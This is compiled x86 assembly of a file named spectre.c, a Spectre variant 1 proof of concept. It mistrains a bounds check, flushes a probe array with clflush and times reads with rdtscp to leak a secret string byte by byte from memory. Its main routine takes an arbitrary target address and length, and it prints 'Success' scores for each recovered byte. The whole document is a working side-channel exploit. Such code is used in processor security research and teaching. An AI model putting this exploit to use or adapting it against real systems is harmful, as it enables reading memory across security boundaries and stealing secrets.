	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	calll	.L0$pb
	.cfi_adjust_cfa_offset 4
.L0$pb:
	popl	%eax
	.cfi_adjust_cfa_offset -4
.Ltmp0:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb), %eax
	movl	array1_size@GOTOFF(%eax), %ecx
	xorl	%eax, %eax
	cmpl	4(%esp), %ecx
	seta	%al
	retl
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	calll	.L1$pb
	.cfi_adjust_cfa_offset 4
.L1$pb:
	popl	%eax
	.cfi_adjust_cfa_offset -4
.Ltmp1:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb), %eax
	movl	4(%esp), %ecx
	movl	array1_size@GOTOFF(%eax), %edx
	cmpl	%ecx, %edx
	jbe	.LBB1_2
# %bb.1:
	movzbl	array1@GOTOFF(%eax,%ecx), %ecx
	shll	$9, %ecx
	movb	array2@GOTOFF(%eax,%ecx), %cl
	andb	%cl, temp@GOTOFF(%eax)
.LBB1_2:
	retl
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	pushl	%ebx
	.cfi_def_cfa_offset 12
	pushl	%edi
	.cfi_def_cfa_offset 16
	pushl	%esi
	.cfi_def_cfa_offset 20
	subl	$28, %esp
	.cfi_def_cfa_offset 48
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	.cfi_offset %ebp, -8
	calll	.L2$pb
	.cfi_adjust_cfa_offset 4
.L2$pb:
	popl	%ebx
	.cfi_adjust_cfa_offset -4
.Ltmp2:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb), %ebx
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	readMemoryByte.results@GOTOFF(%ebx), %eax
	pushl	$1024                           # imm = 0x400
	.cfi_adjust_cfa_offset 4
	pushl	$0
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	$999, 12(%esp)                  # 4-byte Folded Spill
                                        # imm = 0x3E7
	.p2align	4, 0x90
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_29 Depth 3
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_12 Depth 2
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	array2@GOTOFF(%ebx,%eax)
	clflush	array2@GOTOFF+512(%ebx,%eax)
	clflush	array2@GOTOFF+1024(%ebx,%eax)
	clflush	array2@GOTOFF+1536(%ebx,%eax)
	clflush	array2@GOTOFF+2048(%ebx,%eax)
	clflush	array2@GOTOFF+2560(%ebx,%eax)
	clflush	array2@GOTOFF+3072(%ebx,%eax)
	clflush	array2@GOTOFF+3584(%ebx,%eax)
	addl	$4096, %eax                     # imm = 0x1000
	cmpl	$131072, %eax                   # imm = 0x20000
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movl	12(%esp), %eax                  # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%ebx)
	movl	%edx, %edi
	movl	%edx, %esi
	xorl	48(%esp), %edi
	movl	$29, %ebp
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	movl	%ebp, %eax
	movl	$-1431655765, %ecx              # imm = 0xAAAAAAAB
	mull	%ecx
	shrl	%edx
	andl	$-2, %edx
	leal	(%edx,%edx,2), %eax
	notl	%eax
	addl	%ebp, %eax
	movl	%eax, %ecx
	andl	$-65536, %ecx                   # imm = 0xFFFF0000
	shrl	$16, %eax
	orl	%ecx, %eax
	andl	%edi, %eax
	xorl	%esi, %eax
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	victim_function
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	subl	$1, %ebp
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_29 Depth 3
	clflush	array1_size@GOTOFF(%ebx)
	movl	$0, 20(%esp)
	movl	20(%esp), %eax
	cmpl	$99, %eax
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_29:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 20(%esp)
	movl	20(%esp), %eax
	cmpl	$100, %eax
	jl	.LBB2_29
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	movl	$13, %ecx
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_10:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$167, %ecx
	cmpl	$42765, %ecx                    # imm = 0xA70D
	je	.LBB2_11
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movl	%ecx, 16(%esp)                  # 4-byte Spill
	movzbl	%cl, %esi
	movl	%esi, %eax
	movl	%esi, 24(%esp)                  # 4-byte Spill
	shll	$9, %esi
	rdtscp
	movl	%eax, %edi
	movl	%edx, %ebp
	movzbl	array2@GOTOFF(%ebx,%esi), %eax
	rdtscp
	movl	%ecx, %esi
	subl	%edi, %eax
	sbbl	%ebp, %edx
	movl	$50, %ecx
	cmpl	%eax, %ecx
	movl	16(%esp), %ecx                  # 4-byte Reload
	movl	$0, %eax
	sbbl	%edx, %eax
	jb	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	12(%esp), %eax                  # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%ebx)
	cmpb	array1@GOTOFF(%ebx,%edx), %cl
	je	.LBB2_10
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	24(%esp), %eax                  # 4-byte Reload
	addl	$1, readMemoryByte.results@GOTOFF(%ebx,%eax,4)
	jmp	.LBB2_10
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_1 Depth=1
	movl	%esi, 16(%esp)                  # 4-byte Spill
	movl	$-1, %eax
	xorl	%edi, %edi
	leal	readMemoryByte.results@GOTOFF+4(%ebx), %ebp
	movl	$-1, %ecx
	jmp	.LBB2_12
	.p2align	4, 0x90
.LBB2_19:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%eax, %ecx
	movl	%esi, %eax
.LBB2_24:                               #   in Loop: Header=BB2_12 Depth=2
	addl	$2, %edi
	addl	$8, %ebp
	cmpl	$256, %edi                      # imm = 0x100
	je	.LBB2_25
.LBB2_12:                               #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	testl	%eax, %eax
	js	.LBB2_13
# %bb.14:                               #   in Loop: Header=BB2_12 Depth=2
	movl	-4(%ebp), %edx
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%eax,4), %edx
	jge	.LBB2_13
# %bb.15:                               #   in Loop: Header=BB2_12 Depth=2
	testl	%ecx, %ecx
	js	.LBB2_17
# %bb.16:                               #   in Loop: Header=BB2_12 Depth=2
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %edx
	jl	.LBB2_18
.LBB2_17:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%edi, %ecx
	jmp	.LBB2_18
	.p2align	4, 0x90
.LBB2_13:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%eax, %ecx
	movl	%edi, %eax
.LBB2_18:                               #   in Loop: Header=BB2_12 Depth=2
	leal	1(%edi), %esi
	testl	%eax, %eax
	js	.LBB2_19
# %bb.20:                               #   in Loop: Header=BB2_12 Depth=2
	movl	(%ebp), %edx
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%eax,4), %edx
	jge	.LBB2_19
# %bb.21:                               #   in Loop: Header=BB2_12 Depth=2
	testl	%ecx, %ecx
	js	.LBB2_23
# %bb.22:                               #   in Loop: Header=BB2_12 Depth=2
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %edx
	jl	.LBB2_24
.LBB2_23:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%esi, %ecx
	jmp	.LBB2_24
	.p2align	4, 0x90
.LBB2_25:                               #   in Loop: Header=BB2_1 Depth=1
	movl	readMemoryByte.results@GOTOFF(%ebx,%eax,4), %edi
	movl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %esi
	leal	(%esi,%esi), %edx
	addl	$5, %edx
	cmpl	%edx, %edi
	jge	.LBB2_28
# %bb.26:                               #   in Loop: Header=BB2_1 Depth=1
	xorl	$2, %edi
	orl	%esi, %edi
	je	.LBB2_28
# %bb.27:                               #   in Loop: Header=BB2_1 Depth=1
	movl	12(%esp), %esi                  # 4-byte Reload
	leal	-1(%esi), %edx
	cmpl	$1, %esi
	movl	%edx, 12(%esp)                  # 4-byte Spill
	ja	.LBB2_1
.LBB2_28:
	movl	16(%esp), %edx                  # 4-byte Reload
	xorl	%edx, readMemoryByte.results@GOTOFF(%ebx)
	movl	52(%esp), %esi
	movb	%al, (%esi)
	movl	readMemoryByte.results@GOTOFF(%ebx,%eax,4), %eax
	movl	56(%esp), %edx
	movl	%eax, (%edx)
	movb	%cl, 1(%esi)
	movl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %eax
	movl	%eax, 4(%edx)
	addl	$28, %esp
	.cfi_def_cfa_offset 20
	popl	%esi
	.cfi_def_cfa_offset 16
	popl	%edi
	.cfi_def_cfa_offset 12
	popl	%ebx
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	pushl	%ebx
	.cfi_def_cfa_offset 12
	pushl	%edi
	.cfi_def_cfa_offset 16
	pushl	%esi
	.cfi_def_cfa_offset 20
	subl	$60, %esp
	.cfi_def_cfa_offset 80
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	.cfi_offset %ebp, -8
	calll	.L3$pb
	.cfi_adjust_cfa_offset 4
.L3$pb:
	popl	%ebx
	.cfi_adjust_cfa_offset -4
.Ltmp3:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb), %ebx
	movl	stdin@GOT(%ebx), %esi
	leal	check@GOTOFF(%ebx), %eax
	movl	%eax, 44(%esp)                  # 4-byte Spill
	leal	.L.str.13@GOTOFF(%ebx), %eax
	movl	%eax, 40(%esp)                  # 4-byte Spill
	leal	.L.str.1@GOTOFF(%ebx), %eax
	movl	%eax, 36(%esp)                  # 4-byte Spill
	leal	array1@GOTOFF(%ebx), %eax
	movl	%eax, 24(%esp)                  # 4-byte Spill
	leal	array2@GOTOFF(%ebx), %eax
	movl	%eax, 32(%esp)                  # 4-byte Spill
	leal	.L.str.2@GOTOFF(%ebx), %eax
	movl	%eax, 28(%esp)                  # 4-byte Spill
	leal	22(%esp), %edi
	movl	%esi, 48(%esp)                  # 4-byte Spill
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_12:                               #   in Loop: Header=BB3_1 Depth=1
	calll	getpid@PLT
	xorl	%ecx, %ecx
	movl	44(%esp), %edx                  # 4-byte Reload
	addl	$33, %edx
	setb	%cl
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	pushl	52(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_7 Depth 2
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	(%esi)
	.cfi_adjust_cfa_offset 4
	calll	getc@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB3_12
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB3_13
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	movl	secret@GOTOFF(%ebx), %eax
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	48(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	secret@GOTOFF(%ebx), %eax
	movl	%eax, %ecx
	subl	24(%esp), %ecx                  # 4-byte Folded Reload
	movl	%ecx, 16(%esp)
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	strlen@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	%eax, %esi
	movl	%eax, 12(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	pushl	$131072                         # imm = 0x20000
	.cfi_adjust_cfa_offset 4
	pushl	$1
	.cfi_adjust_cfa_offset 4
	pushl	44(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	cmpl	$3, 80(%esp)
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	20(%esp), %eax
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	36(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	movl	96(%esp), %esi
	pushl	4(%esi)
	.cfi_adjust_cfa_offset 4
	calll	__isoc99_sscanf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	24(%esp), %eax                  # 4-byte Reload
	subl	%eax, 16(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	.L.str.3@GOTOFF(%ebx), %eax
	leal	16(%esp), %ecx
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	8(%esi)
	.cfi_adjust_cfa_offset 4
	calll	__isoc99_sscanf@PLT
	addl	$12, %esp
	.cfi_adjust_cfa_offset -12
	leal	.L.str.4@GOTOFF(%ebx), %eax
	pushl	16(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	24(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	12(%esp), %esi
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	subl	$8, %esp
	.cfi_adjust_cfa_offset 8
	leal	.L.str.5@GOTOFF(%ebx), %eax
	pushl	%esi
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	jmp	.LBB3_7
	.p2align	4, 0x90
.LBB3_10:                               #   in Loop: Header=BB3_7 Depth=2
	.cfi_def_cfa_offset 80
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	$10
	.cfi_adjust_cfa_offset 4
	calll	putchar@PLT
.LBB3_7:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	12(%esp), %eax
	leal	-1(%eax), %ecx
	movl	%ecx, 12(%esp)
	testl	%eax, %eax
	jle	.LBB3_11
# %bb.8:                                #   in Loop: Header=BB3_7 Depth=2
	subl	$8, %esp
	.cfi_adjust_cfa_offset 8
	leal	.L.str.6@GOTOFF(%ebx), %eax
	pushl	24(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	16(%esp), %eax
	leal	1(%eax), %ecx
	movl	%ecx, 16(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	56(%esp), %ecx
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%edi
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	readMemoryByte
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	52(%esp), %ebp
	movl	56(%esp), %esi
	leal	(%esi,%esi), %eax
	cmpl	%eax, %ebp
	leal	.L.str.9@GOTOFF(%ebx), %eax
	leal	.L.str.8@GOTOFF(%ebx), %ecx
	cmovll	%eax, %ecx
	subl	$8, %esp
	.cfi_adjust_cfa_offset 8
	leal	.L.str.7@GOTOFF(%ebx), %eax
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movzbl	22(%esp), %eax
	movl	%eax, %ecx
	addb	$-32, %cl
	cmpb	$95, %cl
	movl	$63, %ecx
	cmovbl	%eax, %ecx
	leal	.L.str.10@GOTOFF(%ebx), %edx
	pushl	%ebp
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	testl	%esi, %esi
	jle	.LBB3_10
# %bb.9:                                #   in Loop: Header=BB3_7 Depth=2
	movzbl	23(%esp), %eax
	movl	%eax, %ecx
	addb	$-32, %cl
	cmpb	$95, %cl
	movl	$63, %ecx
	cmovbl	%eax, %ecx
	leal	.L.str.11@GOTOFF(%ebx), %edx
	pushl	%esi
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	jmp	.LBB3_10
	.p2align	4, 0x90
.LBB3_11:                               #   in Loop: Header=BB3_1 Depth=1
	movl	48(%esp), %esi                  # 4-byte Reload
	jmp	.LBB3_1
.LBB3_13:
	xorl	%eax, %eax
	addl	$60, %esp
	.cfi_def_cfa_offset 20
	popl	%esi
	.cfi_def_cfa_offset 16
	popl	%edi
	.cfi_def_cfa_offset 12
	popl	%ebx
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	131056
	.size	array2, 131072

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p... "
	.size	.L.str.6, 32

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
